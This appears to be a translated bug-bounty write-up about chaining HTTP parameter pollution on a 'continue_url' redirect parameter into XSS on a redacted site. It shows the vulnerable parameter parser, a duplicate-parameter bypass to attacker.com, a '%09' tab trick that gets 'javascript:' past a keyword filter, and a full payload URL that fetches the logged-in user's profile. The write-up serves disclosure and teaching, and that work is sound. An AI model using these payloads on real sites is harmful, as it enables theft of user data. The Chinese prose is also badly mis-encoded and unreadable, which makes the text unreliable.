# çªƒå–ç”¨æˆ·ä¿¡æ¯-é“¾æ¥ XSS å’Œ Http å‚æ•°æ±¡æŸ“

> åŸæ–‡ï¼š<https://levelup.gitconnected.com/stealing-user-information-via-xss-via-parameter-pollution-7d99b3379e7d>

æˆ‘æ­£åœ¨é—²é€›ï¼Œçªç„¶è¿™æ¡æ¨ç‰¹å‡ºç°åœ¨æˆ‘çš„æ–°é—»è®¢é˜…é‡Œã€‚

![](img/daa10d6d7a71f6c7c10863f62df6d8b1.png)

[@zseano](http://twitter.com/zseano) åŠ±å¿—æ¨æ–‡ğŸ˜è®©æˆ‘çƒ­æ³ªç›ˆçœ¶

ç„¶åï¼Œæˆ‘å†³å®šç»™è‡ªå·±ä¸€ä¸ªæ–°çš„å¼€å§‹ï¼Œå› ä¸ºç°åœ¨æ˜¯ 2021 å¹´ğŸ‰ã€‚æˆ‘ç™»å½•äº†æˆ‘çš„ [bugcrowd](https://bugcrowd.com) è´¦å·ï¼Œæ ¹æ®æˆ‘çš„æŠ€èƒ½æŒ‘é€‰äº†ä¸€ä¸ªåˆé€‚çš„ç›®æ ‡(åœ¨è¿™ä¸ªç›®æ ‡ä¸Šæˆ‘æ›¾ç»å‘ç°è¿‡ bug)ã€‚

æˆ‘ä»æºä»£ç å®¡æŸ¥å¼€å§‹ï¼Œå®¡æŸ¥äº†ä»–ä»¬çš„ä¸€å † javascript æ–‡ä»¶ï¼Œæœ€ç»ˆå‘ç°ä¸¤ä¸ªç«¯ç‚¹ä¼¼ä¹å®¹æ˜“å—åˆ°**å¼€æ”¾é‡å®šå‘+ XSS** çš„æ”»å‡»ï¼Œå› ä¸ºå¼€å‘äººå‘˜å…è®¸åº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œç‰¹å®šæ“ä½œåé‡å®šå‘ç”¨æˆ·ï¼Œè€Œä¸æ˜¯æœåŠ¡å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤º:

```
function get_param(param) {
    var params = {};
    var url = window.location.href;
    var start = url.indexOf('?');
    start = start < 0 ? url.length : start + 1;
    var end = url.indexOf('#');
    end = end < 0 ? url.length : end;
    var parameters = url.slice(start,end).split('&');for ( var i = 0; i < parameters.length; i++) {
        var parameter = parameters[i].split('=');
        params[parameter[0]] = parameter[1];
    } return params[param];
}// redirect from application
window.location.href = get_param("continue_url"); 
```

# æµ‹è¯•

æˆ‘é¦–å…ˆè¯•å›¾è·å¾—ä¸€ä¸ªå¼€æ”¾çš„é‡å®šå‘ï¼Œä½†æ˜¯æœåŠ¡å™¨åœ¨å‘ç°ä»»ä½•å…¶ä»–åŸŸæˆ–åœ¨`continue_url`å‚æ•°ä¸­çš„æœ‰æ•ˆè´Ÿè½½æ—¶é‡å®šå‘åˆ°ä¸€ä¸ª`404`é¡µé¢ã€‚å› ä¸ºæˆ‘å·²ç»æ„è¯†åˆ°æœåŠ¡å™¨çš„ç¯å¢ƒæ˜¯ Java çš„ï¼Œå¹¶ä¸”å®ƒçš„æµè¡Œæ˜¯å› ä¸ºå‚æ•°æ±¡æŸ“ã€‚å› æ­¤ï¼Œæˆ‘å°è¯•ä¸¤æ¬¡æ·»åŠ ç›¸åŒçš„å‚æ•°`?continue_url=redacted.com&continue_url=attacker.com`æ¥éªŒè¯å®ƒï¼Œä»¤æˆ‘æƒŠè®¶çš„æ˜¯ï¼ŒæœåŠ¡å™¨åªæ£€æŸ¥äº† Uri ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œå¿½ç•¥äº†å—æˆ‘çš„æœ‰æ•ˆè´Ÿè½½å½±å“çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™åªæ˜¯ç»•è¿‡äº†æœåŠ¡å™¨çš„é™åˆ¶ï¼Œå¯¼è‡´é‡å®šå‘åˆ°`attacker.com`ï¼Œä½†è¿™æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ï¼Ÿè®©æˆ‘ä»¬å€’å›å»ã€‚

åœ¨é‚£ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä¹Ÿæœ‰ç‚¹å›°æƒ‘ï¼Œä½†æ˜¯å¦‚æœä½ å’Œ javascript æ›¾ç»æœ‰è¿‡äº¤é›†ï¼Œé‚£ä¹ˆä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°äº†`get_param(param)`å‡½æ•°æœ‰é—®é¢˜ã€‚å¾ˆè€äººå¯»å‘³ï¼Œä¸æ˜¯å—ï¼Ÿä½ ä¹Ÿåº”è¯¥è¯•ä¸€è¯•ã€‚æˆ‘åªèƒ½è¯´ï¼Œè¦ä¹ˆæ˜¯å¼€å‘äººå‘˜æ²¡æœ‰å®Œå…¨æ„è¯†åˆ° Java å¤„ç†å¤šä¸ªåŒåå‚æ•°çš„è¡Œä¸ºï¼Œè¦ä¹ˆæ˜¯ä»–ä»¬åœ¨ç¼–å†™å‡½æ•°æ—¶æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤ï¼Œè¯¥å‡½æ•°åªæ˜¯ç”¨é‡å¤çš„æ¡ç›®è¦†ç›–å‚æ•°(ä»…)çš„å€¼ã€‚

```
params[parameter[0]] = parameter[1];
```

å¦‚æœæœ‰å¤šä¸ªç›¸åŒå‚æ•°çš„æ¡ç›®ï¼Œä¸Šé¢çš„ä»£ç å°†ç®€å•åœ°ç”¨æ–°å€¼é‡å†™é”®`continue_url`çš„æ—§å€¼ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ç”¨æˆ‘ä»¬æä¾›çš„å‚æ•°è°ƒè¯•ä¸Šé¢çš„ä»£ç è¡Œï¼Œå®ƒçœ‹èµ·æ¥ä¼šåƒè¿™æ ·:

```
// setting value to continue_url
params["continue_url"] = "redacted.com"; // overwriting continue_url using parameter pollution
params["continue_url"] = "attacker.com";
```

å› æ­¤ï¼Œparams å¯¹è±¡æœ€ç»ˆå°†åŒ…å«ä»¥ä¸‹é”®/å€¼:

![](img/2b9018efdcb6545b8d4192b32692f2fb.png)

# è·å– XSS å¹¶çªƒå–ç”¨æˆ·ä¿¡æ¯

åœ¨æŒæ¡äº†æœåŠ¡å™¨æ•…éšœçš„è¯€çªåï¼Œæˆ‘æœ€ç»ˆè¯•å›¾å°†è¿™ä¸ªé—®é¢˜å‡çº§åˆ° XSSï¼Œå¹¶ç”¨ javascript æœ‰æ•ˆè½½è·`?continue_url=redacted.com&continue_url=javascript:alert(1)`æ›¿æ¢å®ƒçš„å€¼ï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼ŒæœåŠ¡å™¨è¿”å›äº† **400 é”™è¯¯è¯·æ±‚**é”™è¯¯ï¼Œæˆ‘å°±åƒè¿™æ ·:

![](img/02677581ce86b4e37634ee4b23576ef7.png)

å› æ­¤ï¼Œåœ¨ä½¿ç”¨`continue_url`å‚æ•°åï¼Œæˆ‘ä»¬å‘ç°å³ä½¿é€šè¿‡å‚æ•°æ±¡æŸ“ç»•è¿‡ 404 é”™è¯¯ï¼ŒæœåŠ¡å™¨ä»ç„¶æœ‰ä¸€ç‚¹å®‰å…¨ï¼Œå®ƒä¼šæ£€æŸ¥ä¸`**javascript**`ç›¸å…³çš„å…³é”®å­—ï¼Œå¹¶é™åˆ¶å¸¦æœ‰ **400** é”™è¯¯çš„å“åº”ã€‚

æ‰€ä»¥ï¼Œæˆ‘æƒ³å‡ºäº†ä»¥ä¸‹æµ‹è¯•æ¡ˆä¾‹:

```
**x**javascript:alert(1)  // 400 Bad Request
javaScript**x**:alert(1)  // 400 Bad Request
**x**javascript**x**:alert(1) // 400 Bad Request
java**x**script:alert(1)  // 200 OK (Breaking javascript)
```

åœ¨æ£€æŸ¥äº†è¿™äº›æµ‹è¯•æ¡ˆä¾‹åï¼Œæˆ‘å¾—å‡ºç»“è®ºï¼ŒæœåŠ¡å™¨è¦ä¹ˆä½¿ç”¨ regex ä»å‚æ•°å­—ç¬¦ä¸²ä¸­æå–å¹¶åŒ¹é…å¯èƒ½çš„ **javascript** å…³é”®å­—ï¼Œä»¥é˜²æ­¢å…¶å—åˆ° XSS æ”»å‡»ã€‚ä½†æ˜¯æœ‰ä¸€ç§ç®€å•çš„æ–¹æ³•å¯ä»¥ç»•è¿‡è¿™ç§é™åˆ¶ï¼Œé‚£å°±æ˜¯åœ¨æœ‰æ•ˆè½½è·ä¸­æ”¾å…¥ä¸€ä¸ª urlencoded åˆ¶è¡¨ç¬¦`**%09**`ï¼Œå®ƒå¯ä»¥ç®€å•åœ°ç ´åæœåŠ¡å™¨çš„éªŒè¯ï¼Œè€Œ javascript å®Œå…¨å¿½ç•¥åˆ¶è¡¨ç¬¦ï¼Œè¿™ä¼šå¯¼è‡´å¼¹å‡ºä¸€ä¸ªè­¦å‘Šã€‚æ‰€ä»¥æˆ‘ä½¿ç”¨çš„æœ€ç»ˆæœ‰æ•ˆè½½è·æ˜¯:

```
javas**%09**cript:alert(1) // 200 OK
```

åœ¨åˆ›å»º POC çš„åŒæ—¶ï¼Œæˆ‘æƒ³ä¸ºä»€ä¹ˆä¸åƒæˆ‘ä»¬ä¸€ç›´åšçš„é‚£æ ·ï¼Œé€šè¿‡çªƒå–ç”¨æˆ·ä¿¡æ¯æ¥æé«˜ä¸¥é‡æ€§ï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªç®€å•çš„è„šæœ¬æ¥çªƒå–å½“å‰ç™»å½•çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯:

```
**Script:**
fetch("https://redacted.com/path/to/userinfo").then(a => a.json()).then(a => console.log(a.response)); // Instead of logging user info, an attacker may send it to his/her server**// final payload**
https://redacted.com/endpoint?continue_url=redacted.com&continue_url=java%09Script:fetch(%22https://redacted.com/path/to/userinfo%22).then(a%3D%3Ea.json()).then(a%3D%3Econsole.log(a.response));//
```

# æ§åˆ¶å°ä¸­è®°å½•çš„å—å®³è€…ä¿¡æ¯:

![](img/9ecf6210f36200fab6137bec58633631.png)

æ”»å‡»è€…å¯èƒ½ä¼šå°†å…¶å‘é€åˆ°ä»–/å¥¹çš„æœåŠ¡å™¨ï¼Œä½†æˆ‘ä»¬åªæ˜¯ç™»å½•åˆ°æ§åˆ¶å°è¿›è¡Œæ¼”ç¤ºã€‚

æœ€ç»ˆï¼Œæˆ‘æŠŠå®ƒä¸ŠæŠ¥ç»™äº†è¿™ä¸ªé¡¹ç›®ï¼Œç»è¿‡å‡ å¤©çš„ç­›é€‰ï¼Œæˆ‘ç»ˆäºè·å¾—äº†ä¸€ä¸ªå¾ˆå¥½çš„å¥–åŠ±ğŸ’°é‚£æ˜¯æˆ‘ 2021 å¹´çš„ç¬¬ä¸€ç¬”èµé‡‘ğŸ‰

![](img/3fdac005eb0c60b11d3332b45e7e327b.png)

åœ¨æ¨ç‰¹ä¸Šå…³æ³¨æˆ‘:[å“ˆå§†æ‰Â·é˜¿å¤«ä¸‡](https://twitter.com/hamzaavvan)[@å“ˆå§†æ‰Â·é˜¿å¤«ä¸‡](https://twitter.com/hamzaavvan)

[![](img/9283513f16bb07df227bc70559890a67.png)](https://www.digitalocean.com/?refcode=7b5b6401934f&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=badge)

é“å¾·é»‘å®¢çš„å¿«é€Ÿå¯é çš„ VPS